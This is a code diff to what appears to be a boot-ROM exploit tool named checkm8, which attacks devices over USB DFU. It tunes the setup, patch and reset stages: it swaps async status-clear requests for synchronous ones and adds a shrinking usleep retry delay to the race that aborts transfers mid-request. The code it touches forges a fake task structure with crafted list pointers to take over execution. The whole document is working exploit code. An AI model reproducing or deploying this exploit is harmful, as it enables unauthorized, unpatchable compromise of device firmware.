@@ -275,21 +275,19 @@ checkm8_stage_reset(const handle_t *handle) {
 	if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, data, DFU_FILE_SUFFIX_LEN) == KERN_SUCCESS && dfu_set_state_wait_reset(handle) == KERN_SUCCESS && send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, data, sizeof(data)) == KERN_SUCCESS) {
 		return KERN_SUCCESS;
 	}
-	send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
+	send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0);
 	return KERN_FAILURE;
 }
 
 static kern_return_t
 checkm8_stage_setup(const handle_t *handle) {
 	dfu_overwrite_t overwrite;
-	struct timespec req;
+	useconds_t t_us = 100;
 	transfer_t transfer;
 
-	req.tv_sec = 0;
-	req.tv_nsec = 64;
 	memset(&overwrite, MAGIC, sizeof(overwrite));
 	do {
-		if(send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, &overwrite, sizeof(overwrite), &transfer) != KERN_SUCCESS || nanosleep(&req, NULL) != 0 || (*handle->device)->USBDeviceAbortPipeZero(handle->device) != KERN_SUCCESS) {
+		if(send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, &overwrite, sizeof(overwrite), &transfer) != KERN_SUCCESS || usleep(t_us) != 0 || (*handle->device)->USBDeviceAbortPipeZero(handle->device) != KERN_SUCCESS) {
 			break;
 		}
 		CFRunLoopRun();
@@ -297,7 +295,11 @@ checkm8_stage_setup(const handle_t *handle) {
 			if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBStandard, kUSBDevice), kUSBRqGetStatus, 0, 0, &overwrite, (UInt16)(offsetof(dfu_overwrite_t, synopsys_task.callout) - transfer.sz)) != kIOUSBPipeStalled) {
 				break;
 			}
-			return send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
+			send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0);
+			return KERN_SUCCESS;
+		}
+		if(t_us != 0) {
+			t_us -= 10;
 		}
 	} while(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, &overwrite.extra, sizeof(overwrite.extra)) == KERN_SUCCESS);
 	return KERN_FAILURE;
@@ -375,7 +377,8 @@ checkm8_stage_patch(const handle_t *handle) {
 	overwrite.fake_task.queue_list.prev = overwrite.fake_task.queue_list.next = handle->io_buffer_addr + offsetof(dfu_task_t, ret_waiters_list);
 	overwrite.fake_task.ret_waiters_list.prev = overwrite.fake_task.ret_waiters_list.next = overwrite.fake_task.stack_base + offsetof(dfu_task_t, ret_waiters_list);
 	if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBStandard, kUSBDevice), kUSBRqGetStatus, 0, 0, &overwrite.synopsys_task.callout, sizeof(overwrite) - offsetof(dfu_overwrite_t, synopsys_task.callout)) == kIOUSBPipeStalled) {
-		return send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
+		send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0);
+		return KERN_SUCCESS;
 	}
 	return KERN_FAILURE;
 }
@@ -404,11 +407,11 @@ attached_usb_handle(void *refcon, io_iterator_t iter) {
 					printf("Stage: PATCH");
 					handle->stage = STAGE_ABORT;
 				} else {
-					ret = send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
+					send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0);
+					ret = KERN_SUCCESS;
 					printf("Stage: ABORT");
 				}
 				printf(", ret: 0x%" PRIX32 "\n", ret);
-				usleep(100);
 				if(((*handle->device)->USBDeviceReEnumerate(handle->device, 0) != KERN_SUCCESS || ret != KERN_SUCCESS) && handle->stage != STAGE_ABORT) {
 					handle->stage = STAGE_RESET;
 				}
